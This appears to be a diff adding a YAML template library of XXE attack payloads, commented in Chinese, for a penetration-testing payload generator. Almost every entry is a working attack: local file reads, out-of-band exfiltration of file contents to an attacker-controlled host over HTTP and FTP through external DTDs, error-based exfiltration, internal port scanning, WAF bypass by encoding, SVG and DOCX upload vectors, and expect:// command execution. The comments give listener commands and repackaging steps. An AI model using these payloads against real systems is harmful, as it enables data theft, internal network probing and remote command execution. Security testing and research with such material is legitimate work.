@@ -1,0 +1,317 @@
+ruleDB: v0.1.0
+# XXE 模板。
+#
+# 这是第一个**载荷是完整多行文档**的漏洞类型（前几类都是单行片段）。
+# 也是第一个 content_type 落在 xml 上的——而 xml 恰好有可靠 parser，
+# 所以这一类的模板能做**真正的运行期语法校验**（见方案 §10.2）。
+#
+# 多行载荷走 YAML 块标量 `|-`（末尾不带换行），保证黄金样本逐字节可比。
+
+templates:
+  - id: xxe.generic.detect.entity
+    name: XXE 实体展开探测
+    desc: 最基础的探测，自定义实体被展开说明存在 XXE
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY probe "xxe-ok">]>
+      <foo>&probe;</foo>
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xxe.generic.file.read
+    name: XXE 读文件
+    desc: 外部实体指向本地文件，内容回显在响应里
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://<<filepath>>">]>
+      <foo>&xxe;</foo>
+    vars: [filepath]
+    requires: [weak-hardening, echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xxe.generic.oob.external_dtd
+    name: XXE 外部 DTD 带外
+    desc: 无回显时，让解析器去拉外部 DTD，命中说明 XXE 可用
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo SYSTEM "http://<<lhost>>/<<file>>">
+      <foo>ok</foo>
+    vars: [lhost, file]
+    requires: [outbound, listener]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xxe.generic.oob.exfil
+    name: XXE 外带文件内容（规范写法）
+    desc: 两段式。本载荷只负责让解析器去拉 DTD，DTD 内容见下一条 requires。参数实体引用不能出现在内部子集的标记声明里（XML 规范 WFC），所以嵌套声明必须放在外部 DTD
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % f SYSTEM "file://<<filepath>>">
+        <!ENTITY % d SYSTEM "http://<<lhost>>/exfil.dtd">
+        %d;
+      ]>
+      <foo>ok</foo>
+    vars: [filepath, lhost]
+    requires: [outbound, listener]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xxe.generic.oob.exfil.inline
+    name: XXE 外带文件内容（内联写法，非规范）
+    desc: 把嵌套声明直接写在内部子集里。**不符合 XML 规范**（内部子集的标记声明内不得出现参数实体引用），但部分解析器实际接受，实战中常见。运行期语法校验会如实报失败
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    slots:
+      proto: {options: ["http", "ftp", "file"], default: "http"}
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % f SYSTEM "file://<<filepath>>">
+        <!ENTITY % d "<!ENTITY &#x25; send SYSTEM '<<proto>>://<<lhost>>/?%f;'>">
+        %d;
+        %send;
+      ]>
+      <foo>ok</foo>
+    vars: [filepath, lhost]
+    requires: [outbound, weak-hardening, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xxe.generic.ssrf.port
+    name: XXE 探测内网端口
+    desc: 用外部实体去打内网端口，从响应时间或报错差异判断端口是否开放
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    slots:
+      proto: {options: ["http", "https", "gopher", "dict"], default: "http"}
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "<<proto>>://<<rhost>>:<<rport>>/">]>
+      <foo>&xxe;</foo>
+    vars: [rhost, rport]
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xxe.generic.bypass.utf16
+    name: XXE 用 UTF-16 绕过过滤
+    desc: 按 UTF-16 编码声明文档，绕开基于 ASCII 关键字的 WAF
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    slots:
+      enc: {options: ["UTF-16", "UTF-16BE", "UTF-16LE", "UTF-7"], default: "UTF-16"}
+    body: |-
+      <?xml version="1.0" encoding="<<enc>>"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://<<filepath>>">]>
+      <foo>&xxe;</foo>
+    vars: [filepath]
+    requires: [weak-filter]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: xxe.generic.file.read.filter
+    name: XXE 经 php://filter 读文件
+    desc: 直接 SYSTEM file:// 读二进制或含 XML 特殊字符的文件时，实体内容会让文档解析失败。先用 base64 编码再回显就没这个问题——PHP 目标上优先用这条
+    vuln: [xxe]
+    content_type: [xml]
+    component: [php]
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=<<filepath>>">]>
+      <foo>&xxe;</foo>
+    vars: [filepath]
+    requires: [weak-hardening, echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xxe.generic.oob.error
+    name: XXE 报错外带文件内容
+    desc: 既没有回显、目标又出不了网时的一条路：把文件内容拼进一个不存在的路径，解析错误里会把它带出来。需要页面回显解析器报错
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % f SYSTEM "file://<<filepath>>">
+        <!ENTITY % e "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%f;'>">
+        %e;
+        %err;
+      ]>
+      <foo>ok</foo>
+    vars: [filepath]
+    requires: [error, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 换载体：同样的实体，塞进别的文件类型 ----
+  # 解析器永远是同一个（libxml2 / Xerces / POI 里的那个），变的只是
+  # 「哪条业务线会把这个文件喂给它」。上传口比请求体更容易碰到解析器。
+
+  - id: xxe.generic.svg
+    name: SVG 上传触发 XXE
+    desc: 目标接受 SVG 上传（头像、图标、导入图形）且服务端拿会解析外部实体的库去读它时用。**先确认回显位置**：SVG 被渲染成图片时实体内容在图片里（靠 OCR 或肉眼看），被原样返回时直接出现在响应正文。libxml2 2.9 起默认**不**解析外部实体，PHP 8 上也默认关了——所以这条在老 PHP 5.x / 老 libxml2 的目标上才有戏，先发一个只带内部实体的 `xxe.generic.detect.entity` 探一下
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://<<filepath>>">]>
+      <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+        <text x="10" y="20">&xxe;</text>
+      </svg>
+    vars: [filepath]
+    requires: [weak-hardening, echo]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xxe.generic.docx
+    name: DOCX / XLSX 导入触发 XXE
+    desc: 目标是「导入 Word / Excel」这类功能、服务端用 Apache POI 或别的 OOXML 解析器时用。**这条载荷不是整个 docx**——docx 是 zip，工具产出的是文本，所以它是**替换进包里的那一段 XML**：`unzip` 一个正常 docx → 用这段覆盖 `word/document.xml`（xlsx 换成 `xl/sharedStrings.xml`，pptx 是 `ppt/slides/slide1.xml`）→ 用 zip **重新打包**（注意别把顶层目录套进去，`[Content_Types].xml` 必须在根）→ 上传。解析出来的内容被当成文档内容存库或渲染，**通常没有回显位**，所以多半要配 `xxe.generic.oob.exfil` 那套把文件带出来
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://<<filepath>>">]>
+      <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+      <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
+      </w:document>
+    vars: [filepath]
+    requires: [weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xxe.generic.expect
+    name: XXE 经 expect:// 执行命令
+    desc: 解析器是 PHP（libxml）且装了 expect 扩展时，`expect://` 把实体指向的内容**当命令执行**，命令的 stdout 成为实体值——效果等于命令注入，但走的是 XXE 的路子，能绕掉只盯着命令注入点的过滤。**expect 扩展默认不装**，先在 phpinfo 里确认有这一节；Windows 上没有这个扩展
+    vuln: [xxe]
+    content_type: [xml]
+    component: [php]
+    version: "*"
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://<<command>>">]>
+      <foo>&xxe;</foo>
+    vars: [command]
+    requires: [weak-hardening, echo]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 外部 DTD 外带：完整的三件套 ----
+  #
+  # 三件套是哪三件：
+  #   ① 提交的 XML      —— xxe.generic.oob.exfil（已有），它只负责让解析器去拉 DTD
+  #   ② lhost 上的 DTD  —— 下面两条，把这条的产出存成 lhost 根目录下的 exfil.dtd
+  #   ③ 接收端          —— HTTP 版：`python3 -m http.server 80` 看访问日志，
+  #                        或 `nc -lvnp 80` 看原始请求行（能直接看到 ?<文件内容>）
+  #                        FTP 版：`python3 -m pyftpdlib -p 21`，看 USER/PASS/CWD 命令
+  #
+  # 为什么必须放外部 DTD：参数实体引用**不能出现在内部子集的标记声明里**
+  # （XML 规范的 well-formedness 约束），所以「用 %f; 拼出新的实体声明」这一步
+  # 只能放到外部文件里做。xxe.generic.oob.exfil.inline 是明知违规的写法，
+  # 只在少数解析器上碰巧能过。
+
+  - id: xxe.generic.oob.exfil.dtd
+    name: 外部 DTD（HTTP 外带，存成 lhost 上的 exfil.dtd）
+    desc: "外带三件套的第 ② 件：把这条的产出原样存成 lhost 根目录下的 exfil.dtd，再发 xxe.generic.oob.exfil 那条 XML 触发它。**注意它是 DTD 片段、不是完整 XML 文档**——运行期语法校验会照实报「xml 语法校验未通过」，这是预期的（DTD 本来就只是文档的一部分），不是写错了。规则：先读文件到参数实体 %f，再用 %e 声明一个把 %f 拼进 URL 的新实体，最后依次引用。文件内容里若含空格、换行或 `&`，HTTP 请求行会被截断——所以最好用 w 槽位加一层 base64"
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    slots:
+      w:
+        options:
+          - {id: filter_base64, name: "php://filter 先 base64（PHP 目标，防截断）", prefix: "php://filter/convert.base64-encode/resource="}
+          - {id: plain,         name: "file:// 直接读（内容简单时用）",            prefix: "file://"}
+        default: filter_base64
+    body: |-
+      <!ENTITY % f SYSTEM "<<w.prefix>><<filepath>>">
+      <!ENTITY % e "<!ENTITY &#x25; send SYSTEM 'http://<<lhost>>/?%f;'>">
+      %e;
+      %send;
+    vars: [filepath, lhost]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: xxe.generic.oob.exfil.ftp
+    name: 外部 DTD（FTP 外带）
+    desc: "和上面那条同一套三件套，只把外带通道换成 ftp://——HTTP 出网被拦、但 FTP 能出去时用。**FTP 的好处是文件内容会出现在 FTP 协议命令里**（USER / PASS / CWD 的参数），所以接收端只要一个会记日志的 FTP 服务就行，不用自己写 HTTP 端点；坏处是命令里不能有空格和换行，含这些字符的文件会被截断，一定要先加 base64（用上面那条的 w 槽位）。同样是 DTD 片段，语法校验会报未通过，属预期"
+    vuln: [xxe]
+    content_type: [xml]
+    component: []
+    version: "*"
+    slots:
+      w:
+        options:
+          - {id: filter_base64, name: "php://filter 先 base64（推荐）", prefix: "php://filter/convert.base64-encode/resource="}
+          - {id: plain,         name: "file:// 直接读",                 prefix: "file://"}
+        default: filter_base64
+    body: |-
+      <!ENTITY % f SYSTEM "<<w.prefix>><<filepath>>">
+      <!ENTITY % e "<!ENTITY &#x25; send SYSTEM 'ftp://<<lhost>>/%f;'>">
+      %e;
+      %send;
+    vars: [filepath, lhost]
+    requires: [outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
